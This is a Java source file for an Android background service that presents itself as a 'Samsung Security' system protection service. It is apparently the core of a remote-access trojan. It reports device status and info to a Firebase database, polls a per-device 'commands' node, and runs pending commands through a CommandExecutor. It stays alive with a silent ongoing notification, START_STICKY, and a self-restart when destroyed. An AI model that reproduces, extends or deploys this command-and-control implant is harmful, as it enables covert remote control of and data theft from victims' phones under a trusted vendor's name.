package com.samsung.android.security.v8.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.samsung.android.security.v8.R;
import com.samsung.android.security.v8.core.CommandExecutor;
import com.samsung.android.security.v8.utils.DeviceUtil;

public class CoreService extends Service {
    
    private static final String CHANNEL_ID = "samsung_security_channel";
    private static final int NOTIFICATION_ID = 1;
    
    private DatabaseReference deviceRef;
    private DatabaseReference commandsRef;
    private String deviceId;
    private ValueEventListener presenceListener;
    private ValueEventListener commandsListener;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        deviceId = DeviceUtil.getDeviceId(this);
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        initFirebaseConnection();
        listenForCommands();
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Samsung Security Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("خدمة حماية النظام");
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    private Notification createNotification() {
        Intent intent = new Intent();
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, intent, PendingIntent.FLAG_IMMUTABLE
        );
        
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Samsung Security")
                .setContentText("الخدمة قيد التشغيل")
                .setSmallIcon(R.drawable.ic_security)
                .setOngoing(true)
                .setSilent(true)
                .setContentIntent(pendingIntent)
                .build();
    }
    
    private void initFirebaseConnection() {
        try {
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            deviceRef = database.getReference("devices").child(deviceId);
            commandsRef = deviceRef.child("commands");
            
            updateDeviceStatus(true);
            
            DatabaseReference connectedRef = database.getReference(".info/connected");
            presenceListener = new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot snapshot) {
                    boolean connected = snapshot.getValue(Boolean.class);
                    if (connected) {
                        deviceRef.child("status").setValue("online");
                        deviceRef.child("status").onDisconnect().setValue("offline");
                        updateDeviceInfo();
                    }
                }
                
                @Override
                public void onCancelled(@NonNull DatabaseError error) {}
            };
            
            connectedRef.addValueEventListener(presenceListener);
            
        } catch (Exception e) {}
    }
    
    private void updateDeviceStatus(boolean online) {
        try {
            if (deviceRef != null) {
                deviceRef.child("status").setValue(online ? "online" : "offline");
                deviceRef.child("lastSeen").setValue(System.currentTimeMillis());
            }
        } catch (Exception e) {}
    }
    
    private void updateDeviceInfo() {
        try {
            if (deviceRef != null) {
                deviceRef.child("info").setValue(DeviceUtil.getDeviceInfo(this));
            }
        } catch (Exception e) {}
    }
    
    private void listenForCommands() {
        if (commandsRef == null) return;
        
        commandsListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                for (DataSnapshot commandSnapshot : snapshot.getChildren()) {
                    String commandId = commandSnapshot.getKey();
                    String commandType = commandSnapshot.child("type").getValue(String.class);
                    String status = commandSnapshot.child("status").getValue(String.class);
                    
                    if ("pending".equals(status) && commandType != null) {
                        commandSnapshot.getRef().child("status").setValue("executing");
                        executeCommand(commandId, commandType, commandSnapshot);
                    }
                }
            }
            
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        
        commandsRef.addValueEventListener(commandsListener);
    }
    
    private void executeCommand(String commandId, String commandType, DataSnapshot commandData) {
        try {
            CommandExecutor executor = new CommandExecutor(this, deviceId, commandId);
            executor.execute(commandType, commandData);
        } catch (Exception e) {
            if (commandsRef != null) {
                commandsRef.child(commandId).child("status").setValue("failed");
                commandsRef.child(commandId).child("error").setValue(e.getMessage());
            }
        }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        updateDeviceStatus(false);
        
        if (presenceListener != null && deviceRef != null) {
            deviceRef.getDatabase().getReference(".info/connected")
                    .removeEventListener(presenceListener);
        }
        
        if (commandsListener != null && commandsRef != null) {
            commandsRef.removeEventListener(commandsListener);
        }
        
        Intent restartIntent = new Intent(getApplicationContext(), CoreService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent);
        } else {
            startService(restartIntent);
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
